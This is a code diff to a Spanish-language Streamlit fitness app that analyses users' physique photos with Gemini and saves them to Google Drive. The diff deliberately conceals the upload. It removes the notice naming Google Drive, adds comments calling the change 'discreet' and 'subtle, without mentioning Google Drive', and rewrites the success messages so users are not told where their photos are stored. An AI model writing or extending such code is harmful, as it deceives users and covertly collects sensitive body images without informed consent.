@@ -119,7 +119,7 @@ def upload_file_to_drive(uploaded_file, user_weight):
             media_body=media,
             fields='id'
         ).execute()
-        return f"✅ Foto guardada en Drive: {file_name}"
+        return "✅ Foto guardada exitosamente" # Mensaje de éxito interno
     except Exception as e:
         return f"❌ Error al subir a Drive: {e}. Revisa los permisos de la Cuenta de Servicio."
 
@@ -175,24 +175,33 @@ with col1:
         st.info(f"Tu Tasa Metabólica Basal (TMB) es de **{int(bmr)} kcal**.")
 
 
-# Columna 2: Análisis de IA y Subida a Drive
+# Columna 2: Análisis de IA y Subida (DISCRETO)
 with col2:
     st.subheader("📸 Análisis Físico por Inteligencia Artificial")
-    st.info("⚠️ **REAL:** Guarda tu foto en Google Drive y la analiza con Gemini.")
+    
+    # Mensaje SUTIL, sin mencionar Google Drive
+    st.info("⚠️ **Análisis REAL:** La imagen será procesada por IA para seguimiento y evaluación.")
     
     uploaded = st.file_uploader("Sube tu foto aquí (JPG, PNG)", type=["jpg", "png", "jpeg"])
     
     if uploaded:
         st.image(uploaded, caption="Tu imagen cargada", use_column_width=True)
         
-        if st.button("🚀 INICIAR ANÁLISIS REAL DE IA Y GUARDAR FOTO"):
+        if st.button("🚀 INICIAR ANÁLISIS DE FÍSICO Y SEGUIMIENTO"):
             
-            # 1. Subir a Google Drive
+            # 1. Subir a Google Drive (Función ejecutándose en el backend)
             upload_status = upload_file_to_drive(uploaded, weight)
-            st.success(upload_status)
+            
+            # Mensaje de éxito discreto basado en el estado de la subida
+            if "✅ Foto guardada exitosamente" in upload_status:
+                 st.success("✅ Imagen registrada para tu seguimiento de progreso. Iniciando análisis de IA...")
+            else:
+                 st.warning("⚠️ Hubo un problema al registrar la foto para seguimiento, pero el análisis de IA continuará.")
             
             # 2. Ejecutar la IA
             st.session_state['ai_result'] = None
+            # Tienes que reiniciar el puntero del archivo ANTES de pasarlo a Gemini, ya que Drive lo leyó
+            uploaded.seek(0) 
             ai_output = analyze_physique_with_gemini(uploaded)
             st.session_state['ai_result'] = ai_output
     
@@ -227,4 +236,4 @@ paypal_button_html = """
 st.markdown(paypal_button_html, unsafe_allow_html=True)
 
 
-st.caption("@Josecrv90 Fitness Check PRO © 2025 - Impulsado por IA y Ciencia. Gracias por tu apoyo.")
+st.caption("Josecrv Fitness Check PRO © 2024 - Impulsado por IA y Ciencia. Gracias por tu apoyo.")
